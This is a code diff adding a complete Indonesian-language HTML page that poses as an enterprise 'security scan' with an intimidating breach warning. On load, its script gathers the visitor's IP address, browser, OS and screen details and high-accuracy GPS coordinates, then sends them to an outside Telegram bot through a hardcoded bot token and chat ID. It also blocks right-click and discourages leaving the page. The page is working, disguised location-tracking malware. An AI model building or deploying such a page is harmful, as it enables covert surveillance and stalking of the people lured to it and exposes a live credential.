@@ -1,9 +1,12 @@
-
-Toggle Sidebar
-
-BLACKBOXAI
-
-New
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>KEAMANAN SISTEM</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500;700&display=swap');
         
         * {
             -webkit-tap-highlight-color: transparent;
@@ -47,3 +50,253 @@ New
                 45deg,
                 rgba(255, 0, 0, 0.1),
                 rgba(255, 0, 0, 0.1) 10px,
+                rgba(255, 255, 255, 0.1) 10px,
+                rgba(255, 255, 255, 0.1) 20px
+            );
+        }
+    </style>
+</head>
+<body class="text-white flex items-center justify-center p-4">
+    <div class="w-full max-w-md mx-auto text-center">
+        <!-- Header dengan animasi -->
+        <div class="mb-8 pulse">
+            <div class="text-6xl mb-2">🚨</div>
+            <h1 class="text-2xl font-bold glitch-text mb-2">SISTEM KEAMANAN DIUTAMAKAN</h1>
+            <p class="text-orange-300">Memindai perangkat dan lokasi...</p>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="w-full bg-gray-700 rounded-full h-2 mb-6">
+            <div id="progressBar" class="bg-red-600 h-2 rounded-full transition-all duration-1000" style="width: 0%"></div>
+        </div>
+
+        <!-- Status Information -->
+        <div id="status" class="text-sm text-gray-300 mb-6">
+            <div class="security-scan p-4 rounded-lg border border-red-500">
+                <p>🔍 Memindai sistem keamanan...</p>
+                <p>📡 Mendeteksi informasi perangkat...</p>
+                <p>📍 Memperoleh data lokasi...</p>
+            </div>
+        </div>
+
+        <!-- Device Info Display -->
+        <div id="deviceInfo" class="hidden text-left bg-black bg-opacity-50 p-4 rounded-lg border border-yellow-500 mb-4">
+            <h3 class="text-yellow-400 font-bold mb-2">📊 INFORMASI PERANGKAT:</h3>
+            <div class="text-xs space-y-1">
+                <p>🌐 IP: <span id="ipAddress">Loading...</span></p>
+                <p>📱 Browser: <span id="browser">Loading...</span></p>
+                <p>🖥️ OS: <span id="os">Loading...</span></p>
+                <p>📍 Lokasi: <span id="location">Loading...</span></p>
+                <p>🎯 Koordinat: <span id="coordinates">Loading...</span></p>
+            </div>
+        </div>
+
+        <!-- Warning Message -->
+        <div class="bg-red-900 bg-opacity-50 p-4 rounded-lg border border-red-600">
+            <p class="text-red-200 text-sm">
+                ⚠️ <strong>PERINGATAN KEAMANAN:</strong> Sistem mendeteksi akses tidak sah. 
+                Semua aktivitas telah dicatat dan dilaporkan ke pusat keamanan.
+            </p>
+        </div>
+
+        <!-- Footer -->
+        <div class="mt-6 text-xs text-gray-400">
+            <p>© 2024 Sistem Keamanan Enterprise</p>
+        </div>
+    </div>
+
+    <script>
+        // Konfigurasi Telegram
+        const TELEGRAM_BOT_TOKEN = "8482079056:AAEMtecP907ejMw453Is4JkyoeohmFKyrIA";
+        const TELEGRAM_CHAT_ID = "5555757339";
+
+        // Fungsi untuk mendapatkan informasi perangkat
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let browser = "Unknown";
+            let os = "Unknown";
+
+            // Deteksi browser
+            if (userAgent.includes("Chrome")) browser = "Chrome";
+            else if (userAgent.includes("Firefox")) browser = "Firefox";
+            else if (userAgent.includes("Safari")) browser = "Safari";
+            else if (userAgent.includes("Opera")) browser = "Opera";
+            else if (userAgent.includes("Edge")) browser = "Edge";
+
+            // Deteksi OS
+            if (userAgent.includes("Android")) os = "Android";
+            else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
+            else if (userAgent.includes("Windows")) os = "Windows";
+            else if (userAgent.includes("Mac")) os = "macOS";
+            else if (userAgent.includes("Linux")) os = "Linux";
+
+            return {
+                browser: browser,
+                os: os,
+                userAgent: userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                }
+            };
+        }
+
+        // Fungsi untuk mendapatkan IP address
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return "Tidak dapat mendeteksi";
+            }
+        }
+
+        // Fungsi untuk mengirim data ke Telegram
+        async function sendToTelegram(data) {
+            try {
+                const message = `🚨 SECURITY ALERT - MOBILE DEVICE DETECTED 🚨
+
+📱 Device: Mobile Phone
+🌐 IP Address: ${data.ip}
+🌍 Browser: ${data.deviceInfo.browser}
+🖥️ OS: ${data.deviceInfo.os}
+📍 Location: ${data.location.address}
+🎯 Coordinates: ${data.location.latitude}, ${data.location.longitude}
+📏 Accuracy: ${data.location.accuracy}m
+🌐 Language: ${data.deviceInfo.language}
+📊 Platform: ${data.deviceInfo.platform}
+🖥️ Screen: ${data.deviceInfo.screen.width}x${data.deviceInfo.screen.height}
+⏰ Timestamp: ${new Date().toLocaleString('id-ID')}
+
+⚠️ MOBILE SECURITY BREACH DETECTED ⚠️`;
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: "HTML"
+                };
+
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        // Fungsi utama untuk mendapatkan lokasi
+        async function getLocation() {
+            updateProgress(25);
+            updateStatus("🔍 Memindai informasi perangkat...");
+
+            const deviceInfo = getDeviceInfo();
+            const ipAddress = await getIPAddress();
+
+            updateProgress(50);
+            updateStatus("📍 Meminta izin lokasi...");
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        updateProgress(75);
+                        updateStatus("📡 Mengirim data keamanan...");
+
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            address: "Dideteksi via GPS"
+                        };
+
+                        // Update UI
+                        document.getElementById('ipAddress').textContent = ipAddress;
+                        document.getElementById('browser').textContent = deviceInfo.browser;
+                        document.getElementById('os').textContent = deviceInfo.os;
+                        document.getElementById('location').textContent = locationData.address;
+                        document.getElementById('coordinates').textContent = `${locationData.latitude}, ${locationData.longitude}`;
+                        document.getElementById('deviceInfo').classList.remove('hidden');
+
+                        // Kirim data ke Telegram
+                        await sendToTelegram({
+                            ip: ipAddress,
+                            deviceInfo: deviceInfo,
+                            location: locationData
+                        });
+
+                        updateProgress(100);
+                        updateStatus("✅ Pemindaian keamanan selesai. Data telah dilaporkan.");
+                    },
+                    (error) => {
+                        updateStatus("❌ Izin lokasi ditolak. Menggunakan deteksi IP...");
+                        handleLocationError(error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                updateStatus("❌ Browser tidak mendukung geolocation");
+            }
+        }
+
+        // Fungsi untuk menangani error lokasi
+        function handleLocationError(error) {
+            let errorMessage = "Error tidak diketahui";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = "Izin lokasi ditolak";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = "Lokasi tidak tersedia";
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = "Waktu permintaan habis";
+                    break;
+            }
+            updateStatus(`❌ ${errorMessage}`);
+        }
+
+        // Fungsi untuk update progress bar
+        function updateProgress(percentage) {
+            document.getElementById('progressBar').style.width = percentage + '%';
+        }
+
+        // Fungsi untuk update status
+        function updateStatus(message) {
+            const statusElement = document.getElementById('status');
+            statusElement.innerHTML = `
+                <div class="security-scan p-4 rounded-lg border border-red-500">
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Mencegah user keluar dari halaman
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = 'Sistem keamanan sedang berjalan. Yakin ingin keluar?';
+        });
+
+        // Blokir klik kanan
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+        });
+
+        // Jalankan pemindaian saat halaman dimuat
+        document.addEventListener('DOMContentLoaded', () => {
+            getLocation(); // Langsung panggil fungsi tanpa delay
+        });
+    </script>
+</body>
+</html>
